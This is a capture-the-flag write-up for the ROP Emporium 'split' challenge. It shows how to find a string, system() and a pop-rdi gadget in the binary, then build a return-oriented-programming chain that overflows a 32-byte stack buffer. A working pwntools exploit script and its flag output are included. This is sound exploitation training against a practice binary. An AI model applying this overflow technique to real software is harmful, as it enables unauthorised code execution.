# ROP - Split


## Description 

This challenge has been taken from https://ropemporium.com/challenge/split.html.
The purpose is to call the ```system()``` function with ```/bin/cat flag.txt``` as parameter. We also know that this string is contained in a section inside our binary.
More information in the linked website.

## How to build the ROP chain

Download the challenge:
```sh
$ curl --output split.zip https://ropemporium.com/binary/split.zip
$ unzip split.zip && rm split.zip
```

Since the string is contained in the executable, let's start using ```rabin2``` to locate it:
```sh
$ rabin2 -z split
``` 

```asm
[Strings]

nth paddr      vaddr      len size section type  string

―――――――――――――――――――――――――――――――――――――――――――――――――――――――

0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium
1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n
2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting
3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data...
4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!
5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls
0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt
```

The string is in ```0x00601060```. 
We also know that ```system``` is located somewhere, so check the imported functions from shared libraries:
```sh
$ rabin2 -i split
```

```asm
[Imports]

nth vaddr      bind   type   lib name

―――――――――――――――――――――――――――――――――――――

1   0x00400550 GLOBAL FUNC       puts
2   0x00400560 GLOBAL FUNC       system
3   0x00400570 GLOBAL FUNC       printf
4   0x00400580 GLOBAL FUNC       memset
5   0x00400590 GLOBAL FUNC       read
6   0x00000000 GLOBAL FUNC       __libc_start_main
7   0x00000000 WEAK   NOTYPE     __gmon_start__
8   0x004005a0 GLOBAL FUNC       setvbuf
```

Ok, ```system``` is imported, but what register should we set in order to store the parameter e.g. ```/bin/cat flag.txt```?
Listing the function written by the programmer could be a start...:

```sh
$ rabin2 -qs split | grep -ve imp -e ' 0 '
```

```asm
0x00601078 8 stdout
0x00601080 1 completed.7698
0x004006e8 90 pwnme
0x00400742 17 usefulFunction
0x004007d0 2 __libc_csu_fini
0x00601078 8 stdout@@GLIBC_2.2.5
0x004007e0 4 _IO_stdin_used
0x00601060 18 usefulString
0x00400760 101 __libc_csu_init
0x004005e0 2 _dl_relocate_static_pie
0x004005b0 43 _start
0x00400697 81 main
```

Great! Then disassemble ```usefulFunction```:
```asm
pwndbg> disass usefulFunction
Dump of assembler code for function usefulFunction:
  0x0000000000400742 <+0>:     push   rbp
  0x0000000000400743 <+1>:     mov    rbp,rsp
  0x0000000000400746 <+4>:     mov    edi,0x40084a
  0x000000000040074b <+9>:     call   0x400560 <system@plt>
  0x0000000000400750 <+14>:    nop
  0x0000000000400751 <+15>:    pop    rbp
  0x0000000000400752 <+16>:    ret    
End of assembler dump.
```
As we can see, the edi register is used to store the string, to verify that:

```asm
pwndbg> x/s 0x40084a
```

```asm
0x40084a:       "/bin/ls"
```

Enter to pwndbg (```gdb-pwndbg split```) and disassemble ```pwnme```:

```asm
pwndbg> disass pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   0x00000000004006f0 <+8>:     lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:    mov    edx,0x20
   0x00000000004006f9 <+17>:    mov    esi,0x0
   0x00000000004006fe <+22>:    mov    rdi,rax
   0x0000000000400701 <+25>:    call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:    mov    edi,0x400810
   0x000000000040070b <+35>:    call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:    mov    edi,0x40083c
   0x0000000000400715 <+45>:    mov    eax,0x0
   0x000000000040071a <+50>:    call   0x400570 <printf@plt>
   0x000000000040071f <+55>:    lea    rax,[rbp-0x20]
   0x0000000000400723 <+59>:    mov    edx,0x60
   0x0000000000400728 <+64>:    mov    rsi,rax
   0x000000000040072b <+67>:    mov    edi,0x0
   0x0000000000400730 <+72>:    call   0x400590 <read@plt>
   0x0000000000400735 <+77>:    mov    edi,0x40083f
   0x000000000040073a <+82>:    call   0x400550 <puts@plt>
   0x000000000040073f <+87>:    nop
   0x0000000000400740 <+88>:    leave  
   0x0000000000400741 <+89>:    ret    
End of assembler dump.
```

As we can see there's a ```rax,[rbp-0x20]``` instruction before the read operation. Here ```0x20``` is subtracted from ```rbp``` since they're the bytes allocated to store the input string (32 bytes): if more chars are inserted it's possible to overwrite the return address of this function, so this is the point where the flow of execution will be changed by us.

What remains to do is finding a gadget that pops a value from the stack and puts it into the edi register.

```sh
$ ropper -f split
```
```asm
0x00000000004007c3: pop rdi; ret; 
```

Done.
Now we can build the rop chain. At the ret instruction at the end of ```pwnme``` the stack should be like:  

```
|                    |
|                    |
|      p_gadget      | <-- rsp
|   p_usefulString   |
|      p_system      |
|        ...         |
----------------------
          |
          V
|                    |
|                    |
| 0x00000000004007c3 | <-- rsp
| 0x0000000000601060 |
| 0x000000000040074b |
|         ...        |
----------------------
```

## Exploit

To override the rsp register e.g. find the correct length of the first part of the payload I did some experiments putting a breakpoint in the ret instruction and see what is its content. I found that 40 bytes before ```p_gadget``` are needed.

Moreover, the stack should be 16 bytes aligned so it's necessary to add 4 bytes at the end of the payload.

```python
import pwn

p = pwn.process("./split")

gdb_cmd = [
        'set disassembly-flavor intel',
        #'b *0x0000000000400735',
        #'b *0x0000000000400741',
        'c',
        ]

pwn.gdb.attach(p, gdbscript='\n'.join(gdb_cmd))

# Address of system()
p_system = 0x0040074b
# Address of pop rdi, ret gadget
p_gadget = 0x004007c3
# Address of "/bin/cat flag.txt"
p_usefulString = 0x00601060

# Bytes needed to override rsp
offset = 40

payload = b"A" * offset
payload += pwn.p64(p_gadget)
payload += pwn.p64(p_usefulString)
payload += pwn.p64(p_system)
payload += b"A" * 4

p.recvuntil(b'\n>')
p.sendline(payload)

p.interactive()
```

```sh
$ python3 exploit.py

[+] Starting local process './split': pid 101757
[*] running in new terminal: ['/usr/bin/gdb', '-q', './split', '101757', '-x', '/tmp/pwnywkpk4ct.gdb']
[+] Waiting for debugger: Done
[*] Switching to interactive mode
 Thank you!
ROPE{a_placeholder_32byte_flag!}
$
```  
